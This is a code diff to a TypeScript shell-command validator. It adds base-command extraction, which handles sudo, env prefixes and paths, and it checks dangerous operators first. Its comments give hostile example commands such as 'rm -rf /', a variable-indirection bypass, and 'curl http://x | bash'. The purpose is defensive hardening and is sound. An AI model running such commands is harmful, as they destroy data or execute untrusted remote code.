@@ -23,6 +23,43 @@ export interface CommandValidationResult {
 }
 
 /**
+ * Extract the actual base command from a shell command string.
+ * Handles path prefixes, env assignments, and sudo.
+ *
+ * Examples:
+ *   "/usr/bin/rm -rf /"           → "rm"
+ *   "sudo /usr/bin/rm file"       → "rm"
+ *   "NODE_ENV=prod node app.js"   → "node"
+ *   "env PATH=/x rm -rf /"        → "rm"
+ *   "cmd=rm; $cmd -rf /"          → "cmd" (variable indirection — not expanded)
+ */
+function extractBaseCommand(trimmed: string): string {
+  const tokens = trimmed.split(/\s+/);
+  let i = 0;
+
+  // Skip env assignments (KEY=val, KEY="val", etc.) and prefixed commands
+  while (i < tokens.length) {
+    const tok = tokens[i];
+    if (/^[a-zA-Z_][a-zA-Z0-9_]*=/.test(tok)) {
+      i++;
+      continue;
+    }
+    if (tok === "sudo" || tok === "env" || tok === "command" || tok === "exec" || tok === "nohup") {
+      i++;
+      continue;
+    }
+    break;
+  }
+
+  if (i >= tokens.length) return tokens[0] ?? "";
+
+  // Extract basename from path (e.g. /usr/bin/rm → rm)
+  const raw = tokens[i];
+  const parts = raw.split(/[\\/]/);
+  return parts[parts.length - 1] || raw;
+}
+
+/**
  * Check if a command is allowed based on security configuration
  */
 export function isCommandAllowed(
@@ -42,8 +79,21 @@ export function isCommandAllowed(
     return { allowed: false, reason: "Empty command" };
   }
 
-  // Extract base command (first word)
-  const baseCommand = trimmedCommand.split(/\s+/)[0];
+  // Check dangerous operators FIRST — before parsing the base command.
+  // e.g. "curl http://x | bash" must be caught even though curl isn't blacklisted.
+  if (config.blockDangerousFlags) {
+    for (const op of config.dangerousOperators || []) {
+      if (trimmedCommand.includes(op)) {
+        return {
+          allowed: false,
+          reason: `Operator "${op}" is not allowed`,
+        };
+      }
+    }
+  }
+
+  // Extract actual base command (handles paths, env vars, sudo)
+  const baseCommand = extractBaseCommand(trimmedCommand);
 
   // Check whitelist first (if non-empty, only whitelisted commands are allowed)
   if (config.whitelist.length > 0) {
@@ -55,7 +105,7 @@ export function isCommandAllowed(
     }
   }
 
-  // Check blacklist
+  // Check blacklist (against the extracted basename, not the raw token)
   if (config.blacklist.includes(baseCommand)) {
     return {
       allowed: false,
@@ -63,16 +113,13 @@ export function isCommandAllowed(
     };
   }
 
-  // Check for dangerous operators
-  if (config.blockDangerousFlags) {
-    for (const op of config.dangerousOperators || []) {
-      if (command.includes(op)) {
-        return {
-          allowed: false,
-          reason: `Operator "${op}" is not allowed`,
-        };
-      }
-    }
+  // Also check the raw first token in case it's a simple name
+  const rawFirst = trimmedCommand.split(/\s+/)[0];
+  if (rawFirst !== baseCommand && config.blacklist.includes(rawFirst)) {
+    return {
+      allowed: false,
+      reason: `Command "${rawFirst}" is blacklisted`,
+    };
   }
 
   // Check for dangerous flags
@@ -80,7 +127,7 @@ export function isCommandAllowed(
     for (const flag of config.dangerousFlags || []) {
       // Check for flag as whole word or with equals
       const flagPattern = new RegExp(`(?:^|\\s)${flag}(?:\\s|$|=)`);
-      if (flagPattern.test(command)) {
+      if (flagPattern.test(trimmedCommand)) {
         return {
           allowed: false,
           reason: `Dangerous flag "${flag}" is not allowed`,
